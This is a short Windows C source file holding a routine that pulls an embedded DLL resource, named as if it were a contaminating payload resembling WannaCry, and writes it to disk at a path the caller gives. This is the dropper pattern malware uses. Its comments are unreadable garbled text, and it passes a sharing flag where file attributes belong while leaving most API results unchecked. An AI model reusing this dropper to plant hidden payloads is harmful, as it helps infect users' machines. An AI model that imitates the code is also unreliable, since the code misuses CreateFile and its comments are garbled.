#include "Un-main.h"
#include "resource.h"


int release_file_dll(LPCWSTR Release_File_Process) {
	// IDR_TESTEXE1��������Դ��resource.h�ж������ԴID��
	HRSRC hResInfo = FindResource(NULL, MAKEINTRESOURCE(IDR_WAOTOCRY_CONTAMINATE1), L"dll");
	if (hResInfo == NULL)
	{
		DWORD dwError = GetLastError();
		return -1;
	}

	// ������Դ
	HGLOBAL hResData = LoadResource(NULL, hResInfo);
	// ��ס��Դ
	LPVOID  pvResData = LockResource(hResData);
	// ��ȡ��Դ��С
	DWORD dwResSize = SizeofResource(NULL, hResInfo);
	// �����ļ�
	HANDLE hFile = CreateFile(Release_File_Process, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		NULL, CREATE_ALWAYS, FILE_SHARE_READ, NULL);
	// д�ļ�
	DWORD dwWritten = 0;
	WriteFile(hFile, pvResData, dwResSize, &dwWritten, NULL);


	CloseHandle(hFile);
	FreeResource(hResData);
	return 0;
}